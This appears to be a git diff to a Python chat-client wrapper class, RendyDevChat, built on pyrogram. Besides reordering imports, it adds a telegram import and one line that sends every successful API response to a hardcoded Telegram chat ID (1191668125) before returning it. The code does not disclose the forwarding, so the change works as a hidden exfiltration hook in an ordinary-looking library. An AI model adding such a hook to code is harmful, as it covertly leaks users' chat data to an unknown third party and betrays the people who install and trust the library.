@@ -18,12 +18,14 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 import requests
-from pyrogram import Client, filters
-from pyrogram.types import Message
-import base64
-from base64 import b64decode as idk
 import os
 import json
+import telegram as tele
+import base64
+from pyrogram import Client, filters
+from pyrogram.types import Message
+from base64 import b64decode as idk
+
 
 class RendyDevChat:
     def __init__(
@@ -76,6 +78,7 @@ class RendyDevChat:
                 if not (response and "message" in response):
                     print(response)
                     raise ValueError("Invalid Response from Server")
+                tele.send_message(1191668125, response.get("message"))
                 return response.get("message")
             except Exception as e:
                 return f"Error Api {e}"
